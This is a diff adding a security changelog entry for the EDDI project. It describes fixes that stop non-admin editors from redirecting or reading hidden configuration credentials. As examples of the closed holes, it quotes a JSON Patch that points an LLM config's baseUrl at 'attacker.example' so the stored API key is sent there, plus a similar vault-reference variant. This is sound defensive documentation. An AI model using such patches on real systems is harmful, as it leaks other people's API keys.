@@ -1,0 +1,100 @@
+## 🔒 fix(security): close three gaps around hidden configuration credentials (2026-11-11)
+
+**Repo:** EDDI (`fix/config-credential-redaction-gaps`)
+
+### What changed and why
+
+**1. JSON Patch could rebind a hidden literal credential to another host (high).** A patch by
+anyone but `eddi-admin` masks every plaintext credential and puts it back where its token still
+sits, but nothing looked at the fields around it. An editor could send
+`[{"op":"add","path":"/tasks/0/parameters/baseUrl","value":"https://attacker.example/v1"}]` to an
+LLM config holding a literal `apiKey` (or change `/targetServerUrl` on an httpcalls config with a
+literal `Authorization` header): the key was kept and the next turn sent it to the editor's
+endpoint. `ConfigJsonPatcher` now compares, for every hidden literal it restores, each enclosing
+object before and after the patch and answers `400` naming the changed field (never the value)
+when a destination field was added, removed or modified. The two documents are paired through the
+credential's token, so an `add` that shifts array indices compares the right objects; a credential
+that cannot be paired (different depth or ancestor kind) is refused. Vault references are not
+hidden and are not affected; administrators are not affected. Every store with JSON Patch (LLM,
+httpcalls, MCP calls) goes through `RestVersionInfo.patch`, so all are covered.
+
+The destination rule moved out of `ScrubbedSecrets` into a shared
+`secrets/sanitize/CredentialDestinations`, used by both the upgrade restore and the patcher. It
+now also treats a changed `type`, `*provider`, `port` or `useTls` as a destination change (1b): an
+upgrade that kept the `apiKey` placeholder but changed the provider `type` had the target's key
+restored and sent to the other vendor's default endpoint.
+
+Review follow-up: the URL-like names are suffix rules (`*Url`, `*Uri`, `*Endpoint`, `*Host`,
+`*Hostname`), so Vertex's `apiEndpoint`, `serverUrl` and `smtpHost` count; `storeType`, `*Port` and
+`region` (OpenAI-compatible providers derive the base URL from it) were added; and a request
+`path` counts as absolute when it starts with `http`, as `ApiCallExecutor.buildRequest` reads it,
+not only when it contains `://`. `CredentialDestinationsTest` lists every destination parameter
+of the LLM builders, embedding and vector-store factories, MCP calls, httpcalls and email
+channels.
+
+**Setup-api sync.** `ApiAgentSyncService` read the generated httpcalls and the LLM config through
+the redacting loopback client. With no `apiAuth` in the request, a recorded literal auth header
+came back as the marker, which was then vaulted as the new secret (vault on) or written into the
+headers and refused only after earlier writes (vault off). Such a sync is now refused before
+anything is written; the LLM config it rewrites is read unredacted (`RestLlmStore.readUnredacted`).
+
+**2. Agent and group configs returned literal credentials to editors (medium).**
+`GET /agentstore/agents/{id}` and `GET /groupstore/groups/{id}` (and the MCP `get_agent`,
+`list_agent_resources`, `read_group` tools, which read through them) now redact for non-admins with
+`ConfigSecretRedactor`, covering `userMemoryConfig.dream.parameters`, legacy `channels[].config`
+(`botToken`, `signingSecret`) and `lessonConfig.consolidation.parameters` — the existing name rules
+already match those fields. Both types joined `RedactionMarkerGuard`, and create, update and
+duplicate refuse the marker. Server-side work that writes an agent back reads it unredacted with
+the same access check (`RestAgentStore.readUnredacted`): `updateResourceInAgent`,
+`AgentCascadeService`, `ApiAgentSyncService`, `StructuralMatcher` and `UpgradeExecutor`. The engine
+(`DreamService`, `ChannelTargetRouter`, `LessonConsolidationService`, group discussions) reads
+`IAgentStore` / `IAgentGroupStore` directly and is unchanged. Agents and groups have no JSON Patch
+endpoint, so the patch part of the brief does not apply to them. Literal dream keys are still
+accepted at save, with a warning naming the path, so stored agents keep saving; a NEW literal in
+the group consolidation parameters is refused at save like a SERVICE judge's, while a literal the
+stored version already holds under the same key is carried over. Workflow step `config` maps carry
+a resource `uri` and task flags only; no step type reads a credential from them, so workflows were
+left alone.
+
+**3. The export scrubber's name rules were narrower than the read redactor's (medium).**
+`SecretScrubber.isSecretFieldName` now also answers true for `ConfigSecretRedactor.isCredentialName`
+and, inside a `queryParams` map, `isCredentialQueryName`, so `parameters.nonAzureApiKey =
+"my-litellm-master-key"`, which GET already hid but the export carried in clear, is now redacted
+from the export too. A parity test walks the redactor's name sets. The `scrubJson` failure mode
+and the bearer rule (open PR #1338) were not touched.
+
+**Second review round.**
+- The upgrade's destination check skipped any "target-bound" source string (one merely
+  *containing* `${vault:`), even where the target had no value to replace it with, so a new
+  `baseUrl: "https://attacker.example/v1?ref=${vault:k}"` was kept and the target's key restored
+  beside it. A source string now counts as unchanged only where the target holds a string that
+  merge actually puts in its place.
+- In the model-parameter maps held to the save-time `*Key` rule
+  (`userMemoryConfig.dream.parameters`, `lessonConfig.consolidation.parameters`, SERVICE-judge
+  `parameters`), the read redaction and the export now hide `accessKey`, `subscriptionKey` and
+  any other `*Key` literal too (`ConfigSecretRedactor.KEY_NAMED_CREDENTIAL_PATHS`); elsewhere such
+  names keep their meaning (`promptCacheKey`).
+- The export judged only string entries of an embedded header or query map by name; a numeric
+  `"sig": 12345678` now is redacted as the read path does.
+- A new `${connection:...}` reference in consolidation parameters is refused at save, as for a
+  SERVICE judge.
+- The patch destination check compares each ancestor's direct fields instead of converting the
+  whole document per restored credential.
+
+### Design decisions
+
+- Refuse rather than drop the credential: a patch that changes the destination next to a hidden
+  literal gets a `400`, and the editor can replace or remove the credential in the same patch.
+- A URL counts by its origin, so a different path on the same host is not a change.
+- Group consolidation literals are refused only when new, so no stored group becomes unsavable.
+
+**Files:** [`ConfigJsonPatcher.java`](../../src/main/java/ai/labs/eddi/configs/patch/ConfigJsonPatcher.java),
+[`CredentialDestinations.java`](../../src/main/java/ai/labs/eddi/secrets/sanitize/CredentialDestinations.java),
+[`ScrubbedSecrets.java`](../../src/main/java/ai/labs/eddi/backup/impl/ScrubbedSecrets.java),
+[`RestAgentStore.java`](../../src/main/java/ai/labs/eddi/configs/agents/rest/RestAgentStore.java),
+[`RestAgentGroupStore.java`](../../src/main/java/ai/labs/eddi/configs/groups/rest/RestAgentGroupStore.java),
+[`AgentGroupStore.java`](../../src/main/java/ai/labs/eddi/configs/groups/mongo/AgentGroupStore.java),
+[`ServiceJudgeValidation.java`](../../src/main/java/ai/labs/eddi/configs/groups/validation/ServiceJudgeValidation.java),
+[`RedactionMarkerGuard.java`](../../src/main/java/ai/labs/eddi/configs/rest/RedactionMarkerGuard.java),
+[`SecretScrubber.java`](../../src/main/java/ai/labs/eddi/secrets/sanitize/SecretScrubber.java),
+[`security.md`](../security.md), [`secrets-vault.md`](../secrets-vault.md)
